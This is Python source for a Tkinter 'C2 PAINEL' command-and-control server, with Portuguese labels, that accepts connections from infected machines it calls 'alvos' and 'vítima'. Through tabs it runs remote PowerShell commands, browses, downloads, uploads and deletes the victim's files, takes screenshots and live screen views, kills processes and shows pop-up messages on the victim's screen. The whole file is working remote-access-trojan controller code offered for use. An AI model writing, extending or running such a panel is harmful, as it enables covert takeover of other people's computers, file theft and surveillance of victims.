import socket, os, sys, threading, io, tkinter as tk
from tkinter import ttk, scrolledtext, messagebox, filedialog, simpledialog
from datetime import datetime
from PIL import Image, ImageTk
from chave import enviar_msg, receber_msg, enviar_binario, receber_binario

# ========== CONFIG ==========
HOST = "0.0.0.0"
PORTA = 9001
PASTA_DOWN = os.path.join(os.path.dirname(os.path.abspath(__file__)), "downloads")
os.makedirs(PASTA_DOWN, exist_ok=True)

COR_BG = "#0b0f10"
COR_BG2 = "#11171a"
COR_TEXTO = "#39ff14"
COR_ENTRADA = "#00ff88"
COR_CINZA = "#667777"
COR_BARRA = "#1a2326"
COR_VERMELHO = "#ff4444"
FONTE = ("Consolas", 10)
FONTE_G = ("Consolas", 11, "bold")

alvos = {}          # id: {"conn","ip","info","nome"}
alvo_atual = None
lock = threading.Lock()

# ========== UTIL ==========
def log(t, cor=COR_TEXTO):
    agora = datetime.now().strftime("%H:%M:%S")
    terminal.insert("end", f"[{agora}] ", "hora")
    terminal.insert("end", f"{t}\n", cor)
    terminal.see("end")

def cmd_alvo(comando, timeout=30):
    with lock:
        a = alvos.get(alvo_atual)
    if not a:
        log("Nenhum alvo selecionado", COR_VERMELHO)
        return None
    try:
        enviar_msg(a["conn"], comando)
        return receber_msg(a["conn"], timeout=timeout)
    except Exception as e:
        log(f"ERRO envio: {e}", COR_VERMELHO)
        return None

def atualiza_lista_alvos():
    lb_alvos.delete(0, tk.END)
    with lock:
        for i,d in alvos.items():
            lb_alvos.insert(tk.END, f"[{i}] {d['nome']} @ {d['ip']}")

def selecionar_alvo(evt):
    global alvo_atual
    sel = lb_alvos.curselection()
    if not sel: return
    texto = lb_alvos.get(sel[0])
    aid = int(texto.split("]")[0][1:])
    with lock:
        if aid in alvos:
            alvo_atual = aid
            d = alvos[aid]
            lbl_status.config(text=f"ALVO ATUAL: {d['nome']} | {d['ip']} | {d['info']}", foreground=COR_ENTRADA)
            log(f"-> alvo {aid} selecionado", COR_ENTRADA)
            carregar_pasta_remota(os.path.expanduser("~"))

# ========== ABA 1: TERMINAL POWERSHELL ==========
def terminal_enviar(evt=None):
    linha = entrada_terminal.get().strip()
    entrada_terminal.delete(0, tk.END)
    if not linha: return
    log(f"PS> {linha}", COR_ENTRADA)
    threading.Thread(target=_terminal_rx, args=(linha,), daemon=True).start()

def _terminal_rx(linha):
    r = cmd_alvo(linha, timeout=120)
    if r is None: log("(sem resposta)", "#ff8844")
    else: log(r)

def terminal_limpar(): terminal.delete("1.0", tk.END)

def menu_copiar():
    try:
        terminal.clipboard_clear()
        terminal.clipboard_append(terminal.selection_get())
    except: pass
def menu_colar_entrada():
    try: entrada_terminal.insert(tk.INSERT, terminal.clipboard_get())
    except: pass

# ========== ABA 2: GERENCIADOR DE ARQUIVOS ==========
cwd_remoto = ""

def carregar_pasta_remota(caminho):
    global cwd_remoto
    r = cmd_alvo(f"ls|{caminho}")
    if not r or r.startswith("ERRO"):
        log(f"lista arquivos falhou: {r}", COR_VERMELHO)
        return
    linhas = r.splitlines()
    if linhas and linhas[0].startswith("DIR:"):
        cwd_remoto = linhas[0].split(":",1)[1]
    else:
        cwd_remoto = caminho
    lbl_cwd.config(text=cwd_remoto)
    tv_arquivos.delete(*tv_arquivos.get_children())
    for ln in linhas[1:]:
        try:
            t, sz, nome = ln.split("|", 2)
            sz_fmt = f"{int(sz):,}".replace(",",".") if t == "F" else "<DIR>"
            tv_arquivos.insert("", tk.END, values=(t, nome, sz_fmt, sz))
        except: pass

def arquivo_duplo_clique(evt):
    sel = tv_arquivos.selection()
    if not sel: return
    t, nome, _, sz = tv_arquivos.item(sel[0])["values"]
    if t == "D":
        novo = os.path.join(cwd_remoto, nome) if cwd_remoto else nome
        carregar_pasta_remota(novo)

def arquivo_voltar():
    pai = os.path.dirname(cwd_remoto.rstrip(os.sep))
    if pai and pai != cwd_remoto:
        carregar_pasta_remota(pai)

def arquivo_atualizar():
    if cwd_remoto:
        carregar_pasta_remota(cwd_remoto)

def arquivo_baixar():
    sel = tv_arquivos.selection()
    if not sel: return
    t, nome, _, sz = tv_arquivos.item(sel[0])["values"]
    if t == "D":
        log("Selecione um arquivo, não uma pasta", COR_VERMELHO)
        return
    cam_remoto = os.path.join(cwd_remoto, nome)
    threading.Thread(target=_baixar, args=(cam_remoto,), daemon=True).start()

def _baixar(cam_remoto):
    log(f"baixando: {cam_remoto}", COR_ENTRADA)
    r = cmd_alvo(f"download|{cam_remoto}", timeout=15)
    if not r or not r.startswith("ARQUIVO:"):
        log(f"falhou: {r}", COR_VERMELHO)
        return
    nome = r.split(":",1)[1]
    with lock: a = alvos.get(alvo_atual)
    dados = receber_binario(a["conn"], timeout=300) if a else None
    if not dados:
        log("dados vazios ou timeout", COR_VERMELHO)
        return
    destino = os.path.join(PASTA_DOWN, f"{datetime.now().strftime('%Y%m%d_%H%M%S')}_{nome}")
    with open(destino,"wb") as f: f.write(dados)
    log(f"✅ SALVO NO SEU PC: {destino} ({len(dados):,} bytes)", COR_ENTRADA)
    messagebox.showinfo("Download Concluído", f"Arquivo salvo no seu PC:\n{destino}")

def arquivo_enviar():
    cam_local = filedialog.askopenfilename(title="Enviar arquivo para a vítima")
    if not cam_local: return
    threading.Thread(target=_enviar, args=(cam_local,), daemon=True).start()

def _enviar(cam_local):
    nome = os.path.basename(cam_local)
    log(f"enviando: {nome}", COR_ENTRADA)
    with lock: a = alvos.get(alvo_atual)
    if not a: return
    try:
        with open(cam_local,"rb") as f: dados = f.read()
        enviar_msg(a["conn"], f"upload|{os.path.join(cwd_remoto, nome)}")
        time.sleep(0.15)
        enviar_binario(a["conn"], dados)
        r = receber_msg(a["conn"], timeout=45)
        if r and r.startswith("OK"):
            log(f"✅ ENVIADO: {nome} -> {cwd_remoto}", COR_ENTRADA)
        else:
            log(f"resposta: {r}", COR_VERMELHO)
        arquivo_atualizar()
    except Exception as e:
        log(f"erro envio: {e}", COR_VERMELHO)

def arquivo_criar_pasta():
    nome = simpledialog.askstring("Nova Pasta", "Nome da pasta:")
    if not nome: return
    cam = os.path.join(cwd_remoto, nome)
    r = cmd_alvo(f"mkdir|{cam}")
    log(f"mkdir: {r}")
    arquivo_atualizar()

def arquivo_excluir():
    sel = tv_arquivos.selection()
    if not sel: return
    t, nome, _, _ = tv_arquivos.item(sel[0])["values"]
    if not messagebox.askyesno("Excluir", f"Excluir permanentemente:\n{nome}"): return
    cam = os.path.join(cwd_remoto, nome)
    r = cmd_alvo(f"del|{cam}")
    log(f"del: {r}")
    arquivo_atualizar()

def arquivo_abrir_no_pc():
    """Abre a pasta de downloads do SEU PC"""
    try: os.startfile(PASTA_DOWN)
    except: pass

# ========== ABA 3: TELA ==========
img_tk_ref = None

def tela_capturar():
    threading.Thread(target=_capturar, daemon=True).start()

def _capturar():
    r = cmd_alvo("screenshot", timeout=20)
    if r != "SCREENSHOT_OK":
        log(f"screen: {r}", COR_VERMELHO)
        return
    with lock: a = alvos.get(alvo_atual)
    dados = receber_binario(a["conn"], timeout=45) if a else None
    if not dados:
        log("screen vazio", COR_VERMELHO)
        return
    nome = f"screen_{alvo_atual}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
    cam = os.path.join(PASTA_DOWN, nome)
    with open(cam,"wb") as f: f.write(dados)
    log(f"✅ CAPTURA SALVA NO SEU PC: {cam}", COR_ENTRADA)
    try:
        pil = Image.open(io.BytesIO(dados))
        max_w = max(lbl_tela.winfo_width(), 700)
        max_h = max(lbl_tela.winfo_height(), 450)
        pil.thumbnail((max_w, max_h), Image.Resampling.LANCZOS)
        global img_tk_ref
        img_tk_ref = ImageTk.PhotoImage(pil)
        lbl_tela.config(image=img_tk_ref)
    except Exception as e:
        log(f"mostrar img: {e}", COR_VERMELHO)

live_on = False
def tela_live_toggle():
    global live_on
    if not live_on:
        btn_live.config(text="⏹ PARAR AO VIVO", bg="#882222")
        live_on = True
        threading.Thread(target=_live, daemon=True).start()
    else:
        btn_live.config(text="▶ INICIAR AO VIVO", bg="#1e4a2a")
        live_on = False
        try: cmd_alvo("PARAR_TELA", timeout=3)
        except: pass

def _live():
    r = cmd_alvo("live_start", timeout=10)
    if r != "LIVE_OK":
        log(f"live: {r}", COR_VERMELHO)
        tela_live_toggle()
        return
    with lock: a = alvos.get(alvo_atual)
    if not a: return
    while live_on:
        try:
            dados = receber_binario(a["conn"], timeout=3)
            if not dados: break
            pil = Image.open(io.BytesIO(dados))
            max_w = max(lbl_tela.winfo_width(), 700)
            max_h = max(lbl_tela.winfo_height(), 450)
            pil.thumbnail((max_w, max_h), Image.Resampling.LANCZOS)
            global img_tk_ref
            img_tk_ref = ImageTk.PhotoImage(pil)
            lbl_tela.config(image=img_tk_ref)
        except:
            break
    live_on = False
    btn_live.config(text="▶ INICIAR AO VIVO", bg="#1e4a2a")

# ========== ABA 4: PROCESSOS ==========
def ps_atualizar():
    r = cmd_alvo("ps", timeout=20)
    tv_ps.delete(*tv_ps.get_children())
    if not r: return
    for ln in r.splitlines():
        try:
            pid,nome,user,cpu,mem = ln.split("|")
            tv_ps.insert("", tk.END, values=(pid,nome,user,f"{cpu}%",f"{mem} KB"))
        except: pass

def ps_matar():
    sel = tv_ps.selection()
    if not sel: return
    pid = tv_ps.item(sel[0])["values"][0]
    if not messagebox.askyesno("Matar Processo", f"Finalizar PID {pid}?"): return
    r = cmd_alvo(f"kill|{pid}")
    log(f"kill PID {pid}: {r}")
    ps_atualizar()

# ========== ABA 5: INFO ==========
def info_carregar():
    r = cmd_alvo("info")
    txt_info.delete("1.0", tk.END)
    txt_info.insert("1.0", r or "(sem resposta)")

def info_msgbox():
    txt = simpledialog.askstring("Mensagem", "Texto para mostrar na tela da vítima:")
    if txt:
        r = cmd_alvo(f"msgbox|{txt}")
        log(f"msgbox enviada: {r}")

def info_desconectar():
    if not alvo_atual: return
    if not messagebox.askyesno("Desconectar", "Fechar conexão com este alvo?"): return
    r = cmd_alvo("sair", timeout=3)
    with lock:
        try: alvos[alvo_atual]["conn"].close()
        except: pass
        alvos.pop(alvo_atual, None)
    atualiza_lista_alvos()
    lbl_status.config(text="NENHUM ALVO SELECIONADO", fg=COR_CINZA)
    log(f"alvo {alvo_atual} desconectado", COR_VERMELHO)

# ========== REDE: ACEITAR CONEXÕES ==========
def servidor_loop():
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        srv.bind((HOST, PORTA))
    except Exception as e:
        log(f"PORTA OCUPADA {PORTA}: {e}", COR_VERMELHO)
        return
    srv.listen(20)
    log(f"Servidor ouvindo em {HOST}:{PORTA}", COR_ENTRADA)
    nid = 1
    while True:
        try:
            conn, addr = srv.accept()
            info = receber_msg(conn, timeout=10) or "?"
            nome = info.split("|")[1] if "|" in info else addr[0]
            with lock:
                alvos[nid] = {"conn":conn,"ip":addr[0],"info":info,"nome":nome}
            jan.after(0, atualiza_lista_alvos)
            log(f"✅ NOVA CONEXAO [{nid}] {nome} @ {addr[0]}", COR_ENTRADA)
            nid += 1
        except Exception as e:
            log(f"accept: {e}", COR_VERMELHO)

# ========== MONTAGEM DA GUI ==========
jan = tk.Tk()
jan.title("C2 PAINEL PROFISSIONAL — Preto/Verde")
jan.geometry("1320x780")
jan.configure(bg=COR_BG)
try: jan.iconbitmap(default="")
except: pass

# Estilo TTK
style = ttk.Style(jan)
try: style.theme_use("clam")
except: pass
style.configure("TNotebook", background=COR_BG, borderwidth=0)
style.configure("TNotebook.Tab", background=COR_BARRA, foreground=COR_TEXTO, padding=[14,5], font=FONTE)
style.map("TNotebook.Tab",
          background=[("selected", COR_BG2)],
          foreground=[("selected", COR_ENTRADA)])
style.configure("Treeview", background=COR_BG2, fieldbackground=COR_BG2,
                foreground=COR_TEXTO, font=FONTE, rowheight=22)
style.configure("Treeview.Heading", background=COR_BARRA, foreground=COR_ENTRADA, font=FONTE_G)
style.map("Treeview",
          background=[("selected","#1e4a2a")],
          foreground=[("selected","#ffffff")])

# Barra superior
top = tk.Frame(jan, bg=COR_BARRA, height=46)
top.pack(fill="x")
tk.Label(top, text="⚡ C2 PAINEL", bg=COR_BARRA, fg=COR_ENTRADA,
         font=("Consolas",15,"bold")).pack(side="left", padx=14, pady=8)
lbl_status = tk.Label(top, text="NENHUM ALVO SELECIONADO", bg=COR_BARRA,
                      fg=COR_CINZA, font=FONTE_G)
lbl_status.pack(side="left", padx=24)
tk.Button(top, text="⟳ Info", bg=COR_BG2, fg=COR_TEXTO, command=info_carregar,
          relief="flat", font=FONTE, padx=10).pack(side="right", padx=4, pady=7)
tk.Button(top, text="⏻ Desconectar", bg="#4a1e1e", fg="#fff", command=info_desconectar,
          relief="flat", font=FONTE, padx=10).pack(side="right", padx=4, pady=7)

# Corpo: lista de alvos + abas
corpo = tk.PanedWindow(jan, bg=COR_BG, orient="horizontal", sashwidth=4)
corpo.pack(fill="both", expand=True, padx=8, pady=8)

# Painel esquerdo: alvos
p_esq = tk.Frame(corpo, bg=COR_BG, width=250)
tk.Label(p_esq, text="ALVOS CONECTADOS", bg=COR_BG, fg=COR_ENTRADA, font=FONTE_G).pack(anchor="w", padx=8, pady=6)
lb_alvos = tk.Listbox(p_esq, bg=COR_BG2, fg=COR_TEXTO, font=FONTE,
                      selectbackground="#1e4a2a", selectforeground="#fff",
                      relief="flat", borderwidth=0, activestyle="none")
lb_alvos.pack(fill="both", expand=True, padx=6, pady=4)
lb_alvos.bind("<<ListboxSelect>>", selecionar_alvo)
tk.Button(p_esq, text="⟳ Atualizar", bg=COR_BARRA, fg=COR_TEXTO,
          command=atualiza_lista_alvos, relief="flat", font=FONTE).pack(fill="x", padx=6, pady=4)
corpo.add(p_esq)

# Abas
abas = ttk.Notebook(corpo)
corpo.add(abas)

# ============================================================
# --- Aba 1: TERMINAL POWERSHELL ---
# ============================================================
a_term = tk.Frame(abas, bg=COR_BG)
abas.add(a_term, text="  💻  TERMINAL POWERSHELL  ")

terminal = scrolledtext.ScrolledText(a_term, bg=COR_BG2, fg=COR_TEXTO, font=FONTE,
                                     relief="flat", insertbackground=COR_ENTRADA,
                                     wrap="word", padx=8, pady=6)
terminal.tag_config("hora", foreground=COR_CINZA)
terminal.tag_config(COR_ENTRADA, foreground=COR_ENTRADA)
terminal.tag_config(COR_VERMELHO, foreground=COR_VERMELHO)
terminal.tag_config("#ff8844", foreground="#ff8844")
terminal.pack(fill="both", expand=True, padx=8, pady=8)

# Menu direito copiar
m_term = tk.Menu(terminal, tearoff=0, bg=COR_BG2, fg=COR_TEXTO)
m_term.add_command(label="📋 Copiar seleção", command=menu_copiar)
m_term.add_command(label="📋 Colar na entrada", command=menu_colar_entrada)
m_term.add_separator()
m_term.add_command(label="🗑 Limpar tudo", command=terminal_limpar)
def _popup_term(e):
    try: m_term.tk_popup(e.x_root, e.y_root)
    finally: m_term.grab_release()
terminal.bind("<Button-3>", _popup_term)

bar_term = tk.Frame(a_term, bg=COR_BG)
bar_term.pack(fill="x", padx=8, pady=(0,8))
tk.Label(bar_term, text="PS>", bg=COR_BG, fg=COR_ENTRADA, font=FONTE_G).pack(side="left")
entrada_terminal = tk.Entry(bar_term, bg=COR_BG2, fg=COR_ENTRADA, font=FONTE_G,
                            insertbackground=COR_ENTRADA, relief="flat")
entrada_terminal.pack(side="left", fill="x", expand=True, padx=6)
entrada_terminal.bind("<Return>", terminal_enviar)
entrada_terminal.bind("<Button-3>", lambda e: menu_colar_entrada())
tk.Button(bar_term, text="ENVIAR", bg="#1e4a2a", fg="#fff",
          command=terminal_enviar, relief="flat", font=FONTE_G, padx=14).pack(side="left", padx=3)
tk.Button(bar_term, text="LIMPAR", bg=COR_BARRA, fg=COR_TEXTO,
          command=terminal_limpar, relief="flat", font=FONTE, padx=10).pack(side="left", padx=2)

# ============================================================
# --- Aba 2: ARQUIVOS (CONTINUAÇÃO DA PARTE QUE FALTOU) ---
# ============================================================
a_arq = tk.Frame(abas, bg=COR_BG)
abas.add(a_arq, text="  📂  GERENCIADOR DE ARQUIVOS  ")

# Barra superior da aba arquivos
bar_arq = tk.Frame(a_arq, bg=COR_BG)
bar_arq.pack(fill="x", padx=8, pady=8)
tk.Button(bar_arq, text="⬅ Voltar", bg=COR_BARRA, fg=COR_TEXTO,
          command=arquivo_voltar, relief="flat", font=FONTE, padx=10).pack(side="left", padx=2)
tk.Button(bar_arq, text="⟳ Atualizar", bg=COR_BARRA, fg=COR_TEXTO,
          command=arquivo_atualizar, relief="flat", font=FONTE, padx=10).pack(side="left", padx=2)
tk.Button(bar_arq, text="📁 Nova Pasta", bg=COR_BARRA, fg=COR_TEXTO,
          command=arquivo_criar_pasta, relief="flat", font=FONTE, padx=10).pack(side="left", padx=2)
tk.Button(bar_arq, text="⬇ BAIXAR PRO MEU PC", bg="#1e4a2a", fg="#fff",
          command=arquivo_baixar, relief="flat", font=FONTE_G, padx=12).pack(side="left", padx=4)
tk.Button(bar_arq, text="⬆ ENVIAR DO MEU PC", bg="#2a4a6e", fg="#fff",
          command=arquivo_enviar, relief="flat", font=FONTE_G, padx=12).pack(side="left", padx=4)
tk.Button(bar_arq, text="🗑 Excluir", bg="#4a1e1e", fg="#fff",
          command=arquivo_excluir, relief="flat", font=FONTE, padx=10).pack(side="left", padx=2)
tk.Button(bar_arq, text="📂 Minha Pasta de Downloads", bg=COR_BARRA, fg=COR_ENTRADA,
          command=arquivo_abrir_no_pc, relief="flat", font=FONTE, padx=10).pack(side="right", padx=2)

# Caminho atual
lbl_cwd = tk.Label(a_arq, text="(nenhum)", bg=COR_BG2, fg=COR_ENTRADA,
                   font=FONTE_G, anchor="w", padx=10, pady=6)
lbl_cwd.pack(fill="x", padx=8, pady=(0,4))

# Tabela de arquivos
colunas_arq = ("tipo","nome","tamanho","_sz")
tv_arquivos = ttk.Treeview(a_arq, columns=colunas_arq, show="headings", selectmode="browse")
tv_arquivos.heading("tipo", text="Tipo")
tv_arquivos.heading("nome", text="Nome")
tv_arquivos.heading("tamanho", text="Tamanho")
tv_arquivos.column("tipo", width=70, anchor="center")
tv_arquivos.column("nome", width=700)
tv_arquivos.column("tamanho", width=140, anchor="e")
tv_arquivos.column("_sz", width=0, stretch=False)  # oculta
tv_arquivos.pack(fill="both", expand=True, padx=8, pady=(0,8))
tv_arquivos.bind("<Double-1>", arquivo_duplo_clique)

# ============================================================
# --- Aba 3: TELA ---
# ============================================================
a_tela = tk.Frame(abas, bg=COR_BG)
abas.add(a_tela, text="  🖥  TELA  ")

bar_tela = tk.Frame(a_tela, bg=COR_BG)
bar_tela.pack(fill="x", padx=8, pady=8)
tk.Button(bar_tela, text="📸 CAPTURAR TELA", bg="#1e4a2a", fg="#fff",
          command=tela_capturar, relief="flat", font=FONTE_G, padx=16).pack(side="left", padx=3)
btn_live = tk.Button(bar_tela, text="▶ INICIAR AO VIVO", bg="#1e4a2a", fg="#fff",
                     command=tela_live_toggle, relief="flat", font=FONTE_G, padx=16)
btn_live.pack(side="left", padx=3)
tk.Label(bar_tela, text="(arquivos salvos na sua pasta downloads/)",
         bg=COR_BG, fg=COR_CINZA, font=FONTE).pack(side="left", padx=12)

lbl_tela = tk.Label(a_tela, bg=COR_BG2, fg=COR_CINZA,
                    text="\n\nSelecione um alvo e clique em CAPTURAR TELA\n\n",
                    font=FONTE_G)
lbl_tela.pack(fill="both", expand=True, padx=8, pady=(0,8))

# ============================================================
# --- Aba 4: PROCESSOS ---
# ============================================================
a_ps = tk.Frame(abas, bg=COR_BG)
abas.add(a_ps, text="  ⚙  PROCESSOS  ")

bar_ps = tk.Frame(a_ps, bg=COR_BG)
bar_ps.pack(fill="x", padx=8, pady=8)
tk.Button(bar_ps, text="⟳ Atualizar", bg="#1e4a2a", fg="#fff",
          command=ps_atualizar, relief="flat", font=FONTE_G, padx=14).pack(side="left", padx=3)
tk.Button(bar_ps, text="⛔ Finalizar (kill)", bg="#4a1e1e", fg="#fff",
          command=ps_matar, relief="flat", font=FONTE_G, padx=14).pack(side="left", padx=3)

colunas_ps = ("pid","nome","usuario","cpu","mem")
tv_ps = ttk.Treeview(a_ps, columns=colunas_ps, show="headings")
for c in colunas_ps:
    tv_ps.heading(c, text=c.upper())
tv_ps.column("pid", width=90, anchor="center")
tv_ps.column("nome", width=320)
tv_ps.column("usuario", width=200)
tv_ps.column("cpu", width=90, anchor="e")
tv_ps.column("mem", width=140, anchor="e")
tv_ps.pack(fill="both", expand=True, padx=8, pady=(0,8))

# ============================================================
# --- Aba 5: INFO / AÇÕES ---
# ============================================================
a_info = tk.Frame(abas, bg=COR_BG)
abas.add(a_info, text="  ℹ  INFO  ")

bar_info = tk.Frame(a_info, bg=COR_BG)
bar_info.pack(fill="x", padx=8, pady=8)
tk.Button(bar_info, text="⟳ Carregar Dados", bg="#1e4a2a", fg="#fff",
          command=info_carregar, relief="flat", font=FONTE_G, padx=14).pack(side="left", padx=3)
tk.Button(bar_info, text="💬 Enviar Mensagem", bg="#2a4a6e", fg="#fff",
          command=info_msgbox, relief="flat", font=FONTE_G, padx=14).pack(side="left", padx=3)

txt_info = scrolledtext.ScrolledText(a_info, bg=COR_BG2, fg=COR_TEXTO,
                                     font=FONTE, relief="flat", wrap="word", padx=10, pady=8)
txt_info.pack(fill="both", expand=True, padx=8, pady=(0,8))

# ============================================================
# INICIAR TUDO
# ============================================================
threading.Thread(target=servidor_loop, daemon=True).start()

# Abre a aba de terminal por padrão
abas.select(0)

jan.mainloop()